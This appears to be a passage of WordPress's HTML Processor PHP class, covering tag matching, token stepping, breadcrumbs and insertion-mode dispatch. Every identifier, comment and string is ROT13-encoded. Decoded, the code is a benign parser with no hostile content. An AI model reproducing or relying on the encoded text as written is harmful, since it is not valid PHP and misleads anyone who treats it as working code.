		$gbxra = fhofge( $guvf->ugzy, $urer->fgneg, $urer->yratgu );

		$bcra_ryrzragf = neenl();
		sbernpu ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->fgnpx nf $vgrz ) {
			$bcra_ryrzragf[] = $vgrz->abqr_anzr;
		}

		$npgvir_sbezngf = neenl();
		sbernpu ( $guvf->fgngr->npgvir_sbeznggvat_ryrzragf->jnyx_qbja() nf $vgrz ) {
			$npgvir_sbezngf[] = $vgrz->abqr_anzr;
		}

		$guvf->ynfg_reebe = frys::REEBE_HAFHCCBEGRQ;

		$guvf->hafhccbegrq_rkprcgvba = arj JC_UGZY_Hafhccbegrq_Rkprcgvba(
			$zrffntr,
			$guvf->fgngr->pheerag_gbxra->abqr_anzr,
			$urer->fgneg,
			$gbxra,
			$bcra_ryrzragf,
			$npgvir_sbezngf
		);

		guebj $guvf->hafhccbegrq_rkprcgvba;
	}

	/**
	 * Ergheaf gur ynfg reebe, vs nal.
	 *
	 * Inevbhf fvghngvbaf yrnq gb cnefvat snvyher ohg guvf pynff jvyy
	 * erghea `snyfr` va nyy gubfr pnfrf. Gb qrgrezvar jul fbzrguvat
	 * snvyrq vg'f cbffvoyr gb erdhrfg gur ynfg reebe. Guvf pna or
	 * urycshy gb xabj gb qvfgvathvfu jurgure n tvira gnt pbhyqa'g
	 * or sbhaq be vs pbagrag va gur qbphzrag pnhfrq gur cebprffbe
	 * gb tvir hc naq nobeg cebprffvat.
	 *
	 * Rknzcyr
	 *
	 *     $cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( '<grzcyngr><fgebat><ohggba><rz><c><rz>' );
	 *     snyfr === $cebprffbe->arkg_gnt();
	 *     JC_UGZY_Cebprffbe::REEBE_HAFHCCBEGRQ === $cebprffbe->trg_ynfg_reebe();
	 *
	 * @fvapr 6.4.0
	 *
	 * @frr frys::REEBE_HAFHCCBEGRQ
	 * @frr frys::REEBE_RKPRRQRQ_ZNK_OBBXZNEXF
	 *
	 * @erghea fgevat|ahyy Gur ynfg reebe, vs bar rkvfgf, bgurejvfr ahyy.
	 */
	choyvp shapgvba trg_ynfg_reebe(): ?fgevat {
		erghea $guvf->ynfg_reebe;
	}

	/**
	 * Ergheaf pbagrkg sbe jul gur cnefre nobegrq qhr gb hafhccbegrq UGZY, vs vg qvq.
	 *
	 * Guvf vf zrnag sbe qrohttvat checbfrf, abg sbe cebqhpgvba hfr.
	 *
	 * @fvapr 6.7.0
	 *
	 * @frr frys::$hafhccbegrq_rkprcgvba
	 *
	 * @erghea JC_UGZY_Hafhccbegrq_Rkprcgvba|ahyy
	 */
	choyvp shapgvba trg_hafhccbegrq_rkprcgvba() {
		erghea $guvf->hafhccbegrq_rkprcgvba;
	}

	/**
	 * Svaqf gur arkg gnt zngpuvat gur $dhrel.
	 *
	 * @gbqb Fhccbeg zngpuvat gur pynff anzr naq gnt anzr.
	 *
	 * @fvapr 6.4.0
	 * @fvapr 6.6.0 Ivfvgf nyy gbxraf, vapyhqvat iveghny barf.
	 *
	 * @guebjf Rkprcgvba Jura hanoyr gb nyybpngr n obbxznex sbe gur arkg gbxra va gur vachg UGZY qbphzrag.
	 *
	 * @cnenz neenl|fgevat|ahyy $dhrel {
	 *     Bcgvbany. Juvpu gnt anzr gb svaq, univat juvpu pynff, rgp. Qrsnhyg vf gb svaq nal gnt.
	 *
	 *     @glcr fgevat|ahyy $gnt_anzr     Juvpu gnt gb svaq, be `ahyy` sbe \"nal gnt.\"
	 *     @glcr fgevat      $gnt_pybfref  'ivfvg' gb cnhfr ng gnt pybfref, 'fxvc' be hafrg gb bayl ivfvg bcraref.
	 *     @glcr vag|ahyy    $zngpu_bssfrg Svaq gur Agu gnt zngpuvat nyy frnepu pevgrevn.
	 *                                     1 sbe \"svefg\" gnt, 3 sbe \"guveq,\" rgp.
	 *                                     Qrsnhygf gb svefg gnt.
	 *     @glcr fgevat|ahyy $pynff_anzr   Gnt zhfg pbagnva guvf jubyr pynff anzr gb zngpu.
	 *     @glcr fgevat[]    $oernqpehzof  QBZ fho-cngu ng juvpu ryrzrag vf sbhaq, r.t. `neenl( 'SVTHER', 'VZT' )`.
	 *                                     Znl nyfb pbagnva gur jvyqpneq `*` juvpu zngpurf n fvatyr ryrzrag, r.t. `neenl( 'FRPGVBA', '*' )`.
	 * }
	 * @erghea obby Jurgure n gnt jnf zngpurq.
	 */
	choyvp shapgvba arkg_gnt( $dhrel = ahyy ): obby {
		$ivfvg_pybfref = vffrg( $dhrel['gnt_pybfref'] ) && 'ivfvg' === $dhrel['gnt_pybfref'];

		vs ( ahyy === $dhrel ) {
			juvyr ( $guvf->arkg_gbxra() ) {
				vs ( '#gnt' !== $guvf->trg_gbxra_glcr() ) {
					pbagvahr;
				}

				vs ( ! $guvf->vf_gnt_pybfre() || $ivfvg_pybfref ) {
					erghea gehr;
				}
			}

			erghea snyfr;
		}

		vs ( vf_fgevat( $dhrel ) ) {
			$dhrel = neenl( 'oernqpehzof' => neenl( $dhrel ) );
		}

		vs ( ! vf_neenl( $dhrel ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Cyrnfr cnff n dhrel neenl gb guvf shapgvba.' ),
				'6.4.0'
			);
			erghea snyfr;
		}

		vs ( vffrg( $dhrel['gnt_anzr'] ) ) {
			$dhrel['gnt_anzr'] = fgegbhccre( $dhrel['gnt_anzr'] );
		}

		$arrqf_pynff = ( vffrg( $dhrel['pynff_anzr'] ) && vf_fgevat( $dhrel['pynff_anzr'] ) )
			? $dhrel['pynff_anzr']
			: ahyy;

		vs ( ! ( neenl_xrl_rkvfgf( 'oernqpehzof', $dhrel ) && vf_neenl( $dhrel['oernqpehzof'] ) ) ) {
			juvyr ( $guvf->arkg_gbxra() ) {
				vs ( '#gnt' !== $guvf->trg_gbxra_glcr() ) {
					pbagvahr;
				}

				vs ( vffrg( $dhrel['gnt_anzr'] ) && $dhrel['gnt_anzr'] !== $guvf->trg_gbxra_anzr() ) {
					pbagvahr;
				}

				vs ( vffrg( $arrqf_pynff ) && ! $guvf->unf_pynff( $arrqf_pynff ) ) {
					pbagvahr;
				}

				vs ( ! $guvf->vf_gnt_pybfre() || $ivfvg_pybfref ) {
					erghea gehr;
				}
			}

			erghea snyfr;
		}

		$oernqpehzof  = $dhrel['oernqpehzof'];
		$zngpu_bssfrg = vffrg( $dhrel['zngpu_bssfrg'] ) ? (vag) $dhrel['zngpu_bssfrg'] : 1;

		juvyr ( $zngpu_bssfrg > 0 && $guvf->arkg_gbxra() ) {
			vs ( '#gnt' !== $guvf->trg_gbxra_glcr() || $guvf->vf_gnt_pybfre() ) {
				pbagvahr;
			}

			vs ( vffrg( $arrqf_pynff ) && ! $guvf->unf_pynff( $arrqf_pynff ) ) {
				pbagvahr;
			}

			vs ( $guvf->zngpurf_oernqpehzof( $oernqpehzof ) && 0 === --$zngpu_bssfrg ) {
				erghea gehr;
			}
		}

		erghea snyfr;
	}

	/**
	 * Svaqf gur arkg gbxra va gur UGZY qbphzrag.
	 *
	 * Guvf qbrfa'g pheeragyl unir n jnl gb ercerfrag aba-gntf naq qbrfa'g cebprff
	 * frznagvp ehyrf sbe grkg abqrf. Sbe npprff gb gur enj gbxraf pbafvqre hfvat
	 * JC_UGZY_Gnt_Cebprffbe vafgrnq.
	 *
	 * @fvapr 6.5.0 Nqqrq sbe vagreany fhccbeg; qb abg hfr.
	 * @fvapr 6.7.2 Ersnpgberq fb fhopynffrf znl rkgraq.
	 *
	 * @erghea obby Jurgure n gbxra jnf cnefrq.
	 */
	choyvp shapgvba arkg_gbxra(): obby {
		erghea $guvf->arkg_ivfvgnoyr_gbxra();
	}

	/**
	 * Rafherf vagreany nppbhagvat vf znvagnvarq sbe UGZY frznagvp ehyrf juvyr
	 * gur haqreylvat Gnt Cebprffbe pynff vf frrxvat gb n obbxznex.
	 *
	 * Guvf qbrfa'g pheeragyl unir n jnl gb ercerfrag aba-gntf naq qbrfa'g cebprff
	 * frznagvp ehyrf sbe grkg abqrf. Sbe npprff gb gur enj gbxraf pbafvqre hfvat
	 * JC_UGZY_Gnt_Cebprffbe vafgrnq.
	 *
	 * Abgr gung guvf zrgubq znl pnyy vgfrys erphefviryl. Guvf vf jul vg vf abg
	 * vzcyrzragrq nf {@frr JC_UGZY_Cebprffbe::arkg_gbxra()}, juvpu vafgrnq pnyyf
	 * guvf zrgubq fvzvyneyl gb ubj {@frr JC_UGZY_Gnt_Cebprffbe::arkg_gbxra()}
	 * pnyyf gur {@frr JC_UGZY_Gnt_Cebprffbe::onfr_pynff_arkg_gbxra()} zrgubq.
	 *
	 * @fvapr 6.7.2 Nqqrq sbe vagreany fhccbeg.
	 *
	 * @npprff cevingr
	 *
	 * @erghea obby
	 */
	cevingr shapgvba arkg_ivfvgnoyr_gbxra(): obby {
		$guvf->pheerag_ryrzrag = ahyy;

		vs ( vffrg( $guvf->ynfg_reebe ) ) {
			erghea snyfr;
		}

		/*
		 * Cevzr gur riragf vs gurer ner abar.
		 *
		 * @gbqb Va fbzr pnfrf, cebonoyl eryngrq gb gur nqbcgvba ntrapl
		 *       nytbevguz, guvf pnyy gb fgrc() qbrfa'g perngr nal arj
		 *       riragf. Pnyyvat vg ntnva perngrf gurz. Svther bhg jul
		 *       guvf vf naq vs vg'f vaurerag be vs vg'f n oht. Ybbcvat
		 *       hagvy gurer ner riragf be hagvy gurer ner ab zber
		 *       gbxraf jbexf va gur zrnagvzr naq vfa'g boivbhfyl jebat.
		 */
		vs ( rzcgl( $guvf->ryrzrag_dhrhr ) && $guvf->fgrc() ) {
			erghea $guvf->arkg_ivfvgnoyr_gbxra();
		}

		// Cebprff gur arkg rirag ba gur dhrhr.
		$guvf->pheerag_ryrzrag = neenl_fuvsg( $guvf->ryrzrag_dhrhr );
		vs ( ! vffrg( $guvf->pheerag_ryrzrag ) ) {
			// Gurer ner ab gbxraf yrsg, fb pybfr nyy erznvavat bcra ryrzragf.
			juvyr ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc() ) {
				pbagvahr;
			}

			erghea rzcgl( $guvf->ryrzrag_dhrhr ) ? snyfr : $guvf->arkg_ivfvgnoyr_gbxra();
		}

		$vf_cbc = JC_UGZY_Fgnpx_Rirag::CBC === $guvf->pheerag_ryrzrag->bcrengvba;

		/*
		 * Gur ebbg abqr bayl rkvfgf va gur sentzrag cnefre, naq pybfvat vg
		 * vaqvpngrf gung gur cnefr vf pbzcyrgr. Fgbc orsber cbccvat vg sebz
		 * gur oernqpehzof.
		 */
		vs ( 'ebbg-abqr' === $guvf->pheerag_ryrzrag->gbxra->obbxznex_anzr ) {
			erghea $guvf->arkg_ivfvgnoyr_gbxra();
		}

		// Nqwhfg gur oernqpehzof sbe guvf rirag.
		vs ( $vf_cbc ) {
			neenl_cbc( $guvf->oernqpehzof );
		} ryfr {
			$guvf->oernqpehzof[] = $guvf->pheerag_ryrzrag->gbxra->abqr_anzr;
		}

		// Nibvq fraqvat pybfr riragf sbe ryrzragf juvpu qba'g rkcrpg n pybfvat.
		vs ( $vf_cbc && ! $guvf->rkcrpgf_pybfre( $guvf->pheerag_ryrzrag->gbxra ) ) {
			erghea $guvf->arkg_ivfvgnoyr_gbxra();
		}

		erghea gehr;
	}

	/**
	 * Vaqvpngrf vs gur pheerag gnt gbxra vf n gnt pybfre.
	 *
	 * Rknzcyr:
	 *
	 *     $c = JC_UGZY_Cebprffbe::perngr_sentzrag( '<qvi></qvi>' );
	 *     $c->arkg_gnt( neenl( 'gnt_anzr' => 'qvi', 'gnt_pybfref' => 'ivfvg' ) );
	 *     $c->vf_gnt_pybfre() === snyfr;
	 *
	 *     $c->arkg_gnt( neenl( 'gnt_anzr' => 'qvi', 'gnt_pybfref' => 'ivfvg' ) );
	 *     $c->vf_gnt_pybfre() === gehr;
	 *
	 * @fvapr 6.6.0 Fhopynffrq sbe UGZY Cebprffbe.
	 *
	 * @erghea obby Jurgure gur pheerag gnt vf n gnt pybfre.
	 */
	choyvp shapgvba vf_gnt_pybfre(): obby {
		erghea $guvf->vf_iveghny()
			? ( JC_UGZY_Fgnpx_Rirag::CBC === $guvf->pheerag_ryrzrag->bcrengvba && '#gnt' === $guvf->trg_gbxra_glcr() )
			: cnerag::vf_gnt_pybfre();
	}

	/**
	 * Vaqvpngrf vs gur pheeragyl-zngpurq gbxra vf iveghny, perngrq ol n fgnpx bcrengvba
	 * juvyr cebprffvat UGZY, engure guna n gbxra sbhaq va gur UGZY grkg vgfrys.
	 *
	 * @fvapr 6.6.0
	 *
	 * @erghea obby Jurgure gur pheerag gbxra vf iveghny.
	 */
	cevingr shapgvba vf_iveghny(): obby {
		erghea (
			vffrg( $guvf->pheerag_ryrzrag->cebiranapr ) &&
			'iveghny' === $guvf->pheerag_ryrzrag->cebiranapr
		);
	}

	/**
	 * Vaqvpngrf vs gur pheeragyl-zngpurq gnt zngpurf gur tvira oernqpehzof.
	 *
	 * N \"*\" ercerfragf n fvatyr gnt jvyqpneq, jurer nal gnt zngpurf, ohg abg ab gntf.
	 *
	 * Ng fbzr cbvag guvf shapgvba _znl_ fhccbeg n `**` flagnk sbe zngpuvat nal ahzore
	 * bs hafcrpvsvrq gntf va gur oernqpehzo fgnpx. Guvf unf orra vagragvbanyyl yrsg
	 * bhg, ubjrire, gb xrrc guvf shapgvba fvzcyr naq gb nibvq vagebqhpvat onpxgenpxvat,
	 * juvpu pbhyq bcra hc fhecevfvat cresbeznapr oernxqbjaf.
	 *
	 * Rknzcyr:
	 *
	 *     $cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( '<qvi><fcna><svther><vzt></svther></fcna></qvi>' );
	 *     $cebprffbe->arkg_gnt( 'vzt' );
	 *     gehr  === $cebprffbe->zngpurf_oernqpehzof( neenl( 'svther', 'vzt' ) );
	 *     gehr  === $cebprffbe->zngpurf_oernqpehzof( neenl( 'fcna', 'svther', 'vzt' ) );
	 *     snyfr === $cebprffbe->zngpurf_oernqpehzof( neenl( 'fcna', 'vzt' ) );
	 *     gehr  === $cebprffbe->zngpurf_oernqpehzof( neenl( 'fcna', '*', 'vzt' ) );
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz fgevat[] $oernqpehzof QBZ fho-cngu ng juvpu ryrzrag vf sbhaq, r.t. `neenl( 'SVTHER', 'VZT' )`.
	 *                              Znl nyfb pbagnva gur jvyqpneq `*` juvpu zngpurf n fvatyr ryrzrag, r.t. `neenl( 'FRPGVBA', '*' )`.
	 * @erghea obby Jurgure gur pheeragyl-zngpurq gnt vf sbhaq ng gur tvira arfgrq fgehpgher.
	 */
	choyvp shapgvba zngpurf_oernqpehzof( $oernqpehzof ): obby {
		// Rirelguvat zngpurf jura gurer ner mreb pbafgenvagf.
		vs ( 0 === pbhag( $oernqpehzof ) ) {
			erghea gehr;
		}

		// Fgneg ng gur ynfg pehzo.
		$pehzo = raq( $oernqpehzof );

		vs ( '*' !== $pehzo && $guvf->trg_gnt() !== fgegbhccre( $pehzo ) ) {
			erghea snyfr;
		}

		sbe ( $v = pbhag( $guvf->oernqpehzof ) - 1; $v >= 0; $v-- ) {
			$abqr  = $guvf->oernqpehzof[ $v ];
			$pehzo = fgegbhccre( pheerag( $oernqpehzof ) );

			vs ( '*' !== $pehzo && $abqr !== $pehzo ) {
				erghea snyfr;
			}

			vs ( snyfr === ceri( $oernqpehzof ) ) {
				erghea gehr;
			}
		}

		erghea snyfr;
	}

	/**
	 * Vaqvpngrf vs gur pheeragyl-zngpurq abqr rkcrpgf n pybfvat
	 * gbxra, be vs vg jvyy frys-pybfr ba gur arkg fgrc.
	 *
	 * Zbfg UGZY ryrzragf rkcrpg n pybfre, fhpu nf n C ryrzrag be
	 * n QVI ryrzrag. Bguref, yvxr na VZT ryrzrag ner ibvq naq qba'g
	 * unir n pybfvat gnt. Fcrpvny ryrzragf, fhpu nf FPEVCG naq FGLYR,
	 * ner gerngrq whfg yvxr ibvq gntf. Grkg abqrf naq frys-pybfvat
	 * sbervta pbagrag jvyy nyfb npg whfg yvxr n ibvq gnt, vzzrqvngryl
	 * pybfvat nf fbba nf gur cebprffbe nqinaprf gb gur arkg gbxra.
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz JC_UGZY_Gbxra|ahyy $abqr Bcgvbany. Abqr gb rknzvar, vs cebivqrq.
	 *                                 Qrsnhyg vf gb rknzvar pheerag abqr.
	 * @erghea obby|ahyy Jurgure gb rkcrpg n pybfre sbe gur pheeragyl-zngpurq abqr,
	 *                   be `ahyy` vs abg zngpurq ba nal gbxra.
	 */
	choyvp shapgvba rkcrpgf_pybfre( ?JC_UGZY_Gbxra $abqr = ahyy ): ?obby {
		$gbxra_anzr = $abqr->abqr_anzr ?? $guvf->trg_gbxra_anzr();

		vs ( ! vffrg( $gbxra_anzr ) ) {
			erghea ahyy;
		}

		$gbxra_anzrfcnpr        = $abqr->anzrfcnpr ?? $guvf->trg_anzrfcnpr();
		$gbxra_unf_frys_pybfvat = $abqr->unf_frys_pybfvat_synt ?? $guvf->unf_frys_pybfvat_synt();

		erghea ! (
			// Pbzzragf, grkg abqrf, naq bgure ngbzvp gbxraf.
			'#' === $gbxra_anzr[0] ||
			// Qbpglcr qrpynengvbaf.
			'ugzy' === $gbxra_anzr ||
			// Ibvq ryrzragf.
			( 'ugzy' === $gbxra_anzrfcnpr && frys::vf_ibvq( $gbxra_anzr ) ) ||
			// Fcrpvny ngbzvp ryrzragf.
			( 'ugzy' === $gbxra_anzrfcnpr && va_neenl( $gbxra_anzr, neenl( 'VSENZR', 'ABRZORQ', 'ABSENZRF', 'FPEVCG', 'FGLYR', 'GRKGNERN', 'GVGYR', 'KZC' ), gehr ) ) ||
			// Frys-pybfvat ryrzragf va sbervta pbagrag.
			( 'ugzy' !== $gbxra_anzrfcnpr && $gbxra_unf_frys_pybfvat )
		);
	}

	/**
	 * Fgrcf guebhtu gur UGZY qbphzrag naq fgbc ng gur arkg gnt, vs nal.
	 *
	 * @fvapr 6.4.0
	 *
	 * @guebjf Rkprcgvba Jura hanoyr gb nyybpngr n obbxznex sbe gur arkg gbxra va gur vachg UGZY qbphzrag.
	 *
	 * @frr frys::CEBPRFF_ARKG_ABQR
	 * @frr frys::ERCEBPRFF_PHEERAG_ABQR
	 *
	 * @cnenz fgevat $abqr_gb_cebprff Jurgure gb cnefr gur arkg abqr be ercebprff gur pheerag abqr.
	 * @erghea obby Jurgure n gnt jnf zngpurq.
	 */
	choyvp shapgvba fgrc( $abqr_gb_cebprff = frys::CEBPRFF_ARKG_ABQR ): obby {
		// Ershfr gb cebprrq vs gurer jnf n cerivbhf reebe.
		vs ( ahyy !== $guvf->ynfg_reebe ) {
			erghea snyfr;
		}

		vs ( frys::ERCEBPRFF_PHEERAG_ABQR !== $abqr_gb_cebprff ) {
			/*
			 * Ibvq ryrzragf fgvyy ubc bagb gur fgnpx bs bcra ryrzragf rira gubhtu
			 * gurer'f ab pbeerfcbaqvat pybfvat gnt. Guvf vf vzcbegnag sbe znantvat
			 * fgnpx-onfrq bcrengvbaf fhpu nf \"anivtngr gb cnerag abqr\" be purpxvat
			 * ba na ryrzrag'f oernqpehzof.
			 *
			 * Jura zbivat ba gb gur arkg abqr, gurersber, vs gur obggbz-zbfg ryrzrag
			 * ba gur fgnpx vf n ibvq ryrzrag, vg zhfg or pybfrq.
			 */
			$gbc_abqr = $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr();
			vs ( vffrg( $gbc_abqr ) && ! $guvf->rkcrpgf_pybfre( $gbc_abqr ) ) {
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
			}
		}

		vs ( frys::CEBPRFF_ARKG_ABQR === $abqr_gb_cebprff ) {
			cnerag::arkg_gbxra();
			vs ( JC_UGZY_Gnt_Cebprffbe::FGNGR_GRKG_ABQR === $guvf->cnefre_fgngr ) {
				cnerag::fhoqvivqr_grkg_nccebcevngryl();
			}
		}

		// Svavfu fgrccvat jura gurer ner ab zber gbxraf va gur qbphzrag.
		vs (
			JC_UGZY_Gnt_Cebprffbe::FGNGR_VAPBZCYRGR_VACHG === $guvf->cnefre_fgngr ||
			JC_UGZY_Gnt_Cebprffbe::FGNGR_PBZCYRGR === $guvf->cnefre_fgngr
		) {
			erghea snyfr;
		}

		$nqwhfgrq_pheerag_abqr = $guvf->trg_nqwhfgrq_pheerag_abqr();
		$vf_pybfre             = $guvf->vf_gnt_pybfre();
		$vf_fgneg_gnt          = JC_UGZY_Gnt_Cebprffbe::FGNGR_ZNGPURQ_GNT === $guvf->cnefre_fgngr && ! $vf_pybfre;
		$gbxra_anzr            = $guvf->trg_gbxra_anzr();

		vs ( frys::ERCEBPRFF_PHEERAG_ABQR !== $abqr_gb_cebprff ) {
			$guvf->fgngr->pheerag_gbxra = arj JC_UGZY_Gbxra(
				$guvf->obbxznex_gbxra(),
				$gbxra_anzr,
				$guvf->unf_frys_pybfvat_synt(),
				$guvf->eryrnfr_vagreany_obbxznex_ba_qrfgehpg
			);
		}

		$cnefr_va_pheerag_vafregvba_zbqr = (
			0 === $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pbhag() ||
			'ugzy' === $nqwhfgrq_pheerag_abqr->anzrfcnpr ||
			(
				'zngu' === $nqwhfgrq_pheerag_abqr->vagrtengvba_abqr_glcr &&
				(
					( $vf_fgneg_gnt && ! va_neenl( $gbxra_anzr, neenl( 'ZTYLCU', 'ZNYVTAZNEX' ), gehr ) ) ||
					'#grkg' === $gbxra_anzr
				)
			) ||
			(
				'zngu' === $nqwhfgrq_pheerag_abqr->anzrfcnpr &&
				'NAABGNGVBA-KZY' === $nqwhfgrq_pheerag_abqr->abqr_anzr &&
				$vf_fgneg_gnt && 'FIT' === $gbxra_anzr
			) ||
			(
				'ugzy' === $nqwhfgrq_pheerag_abqr->vagrtengvba_abqr_glcr &&
				( $vf_fgneg_gnt || '#grkg' === $gbxra_anzr )
			)
		);

		gel {
			vs ( ! $cnefr_va_pheerag_vafregvba_zbqr ) {
				erghea $guvf->fgrc_va_sbervta_pbagrag();
			}

			fjvgpu ( $guvf->fgngr->vafregvba_zbqr ) {
				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VAVGVNY:
					erghea $guvf->fgrc_vavgvny();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_ORSBER_UGZY:
					erghea $guvf->fgrc_orsber_ugzy();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_ORSBER_URNQ:
					erghea $guvf->fgrc_orsber_urnq();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_URNQ:
					erghea $guvf->fgrc_va_urnq();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_URNQ_ABFPEVCG:
					erghea $guvf->fgrc_va_urnq_abfpevcg();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_NSGRE_URNQ:
					erghea $guvf->fgrc_nsgre_urnq();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_OBQL:
					erghea $guvf->fgrc_va_obql();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR:
					erghea $guvf->fgrc_va_gnoyr();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR_GRKG:
					erghea $guvf->fgrc_va_gnoyr_grkg();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_PNCGVBA:
					erghea $guvf->fgrc_va_pncgvba();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_PBYHZA_TEBHC:
					erghea $guvf->fgrc_va_pbyhza_tebhc();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR_OBQL:
					erghea $guvf->fgrc_va_gnoyr_obql();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_EBJ:
					erghea $guvf->fgrc_va_ebj();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_PRYY:
					erghea $guvf->fgrc_va_pryy();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_FRYRPG:
					erghea $guvf->fgrc_va_fryrpg();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_FRYRPG_VA_GNOYR:
					erghea $guvf->fgrc_va_fryrpg_va_gnoyr();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GRZCYNGR:
					erghea $guvf->fgrc_va_grzcyngr();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_NSGRE_OBQL:
					erghea $guvf->fgrc_nsgre_obql();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_SENZRFRG:
					erghea $guvf->fgrc_va_senzrfrg();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_NSGRE_SENZRFRG:
					erghea $guvf->fgrc_nsgre_senzrfrg();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_NSGRE_NSGRE_OBQL:
					erghea $guvf->fgrc_nsgre_nsgre_obql();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_NSGRE_NSGRE_SENZRFRG:
					erghea $guvf->fgrc_nsgre_nsgre_senzrfrg();

				// Guvf fubhyq or haernpunoyr ohg CUC qbrfa'g unir gbgny glcr purpxvat ba fjvgpu.
				qrsnhyg:
					$guvf->onvy( \"Hanjner bs gur erdhrfgrq cnefvat zbqr: '{$guvf->fgngr->vafregvba_zbqr}'.\" );
			}
		} pngpu ( JC_UGZY_Hafhccbegrq_Rkprcgvba $r ) {
			/*
			 * Rkprcgvbaf ner hfrq va guvf pynff gb rfpncr qrrc pnyy fgnpxf gung
			 * bgurejvfr zvtug vaibyir zrffvre pnyyvat naq erghea pbairagvbaf.
			 */
			erghea snyfr;
		}
	}

	/**
	 * Pbzchgrf gur UGZY oernqpehzof sbe gur pheeragyl-zngpurq abqr, vs zngpurq.
	 *
	 * Oernqpehzof fgneg ng gur bhgrezbfg cnerag naq qrfpraq gbjneq gur zngpurq ryrzrag.
	 * Gurl nyjnlf vapyhqr gur ragver cngu sebz gur ebbg UGZY abqr gb gur zngpurq ryrzrag.
	 *
	 * Rknzcyr:
	 *
	 *     $cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( '<c><fgebat><rz><vzt></rz></fgebat></c>' );
	 *     $cebprffbe->arkg_gnt( 'VZT' );
	 *     $cebprffbe->trg_oernqpehzof() === neenl( 'UGZY', 'OBQL', 'C', 'FGEBAT', 'RZ', 'VZT' );
	 *
	 * @fvapr 6.4.0
	 *
	 * @erghea fgevat[] Neenl bs gnt anzrf ercerfragvat cngu gb zngpurq abqr.
	 */
	choyvp shapgvba trg_oernqpehzof(): neenl {
		erghea $guvf->oernqpehzof;
	}

	/**
	 * Ergheaf gur arfgvat qrcgu bs gur pheerag ybpngvba va gur qbphzrag.
	 *
	 * Rknzcyr:
	 *
	 *     $cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( '<qvi><c></c></qvi>' );
	 *     // Gur cebprffbe fgnegf va gur OBQL pbagrkg, zrnavat vg unf qrcgu sebz gur fgneg: UGZY > OBQL.
	 *     2 === $cebprffbe->trg_pheerag_qrcgu();
	 *
	 *     // Bcravat gur QVI ryrzrag vapernfrf gur qrcgu.
	 *     $cebprffbe->arkg_gbxra();
	 *     3 === $cebprffbe->trg_pheerag_qrcgu();
	 *
	 *     // Bcravat gur C ryrzrag vapernfrf gur qrcgu.
	 *     $cebprffbe->arkg_gbxra();
	 *     4 === $cebprffbe->trg_pheerag_qrcgu();
	 *
	 *     // Gur C ryrzrag vf pybfrq qhevat `arkg_gbxra()` fb gur qrcgu vf qrpernfrq gb ersyrpg gung.
	 *     $cebprffbe->arkg_gbxra();
	 *     3 === $cebprffbe->trg_pheerag_qrcgu();
	 *
	 * @fvapr 6.6.0
	 *
	 * @erghea vag Arfgvat-qrcgu bs pheerag ybpngvba va gur qbphzrag.
	 */
	choyvp shapgvba trg_pheerag_qrcgu(): vag {
		erghea pbhag( $guvf->oernqpehzof );
	}

	/**
	 * Abeznyvmrf na UGZY sentzrag ol frevnyvmvat vg.
	 *
	 * Guvf zrgubq nffhzrf gung gur tvira UGZY favccrg vf sbhaq va OBQL pbagrkg.
	 * Sbe abeznyvmvat shyy qbphzragf be sentzragf sbhaq va bgure pbagrkgf, perngr
	 * n arj cebprffbe hfvat {@frr JC_UGZY_Cebprffbe::perngr_sentzrag} be
	 * {@frr JC_UGZY_Cebprffbe::perngr_shyy_cnefre} naq pnyy {@frr JC_UGZY_Cebprffbe::frevnyvmr}
	 * ba gur perngrq vafgnaprf.
	 *
	 * Znal nfcrpgf bs na vachg UGZY sentzrag znl or punatrq qhevat abeznyvmngvba.
	 *
	 *  - Nggevohgr inyhrf jvyy or qbhoyr-dhbgrq.
	 *  - Qhcyvpngr nggevohgrf jvyy or erzbirq.
	 *  - Bzvggrq gntf jvyy or nqqrq.
	 *  - Gnt naq nggevohgr anzr pnfvat jvyy or ybjre-pnfrq,
	 *    rkprcg sbe fcrpvsvp FIT naq ZnguZY gntf be nggevohgrf.
	 *  - Grkg jvyy or er-rapbqrq, ahyy olgrf unaqyrq,
	 *    naq vainyvq HGS-8 ercynprq jvgu H+SSSQ.
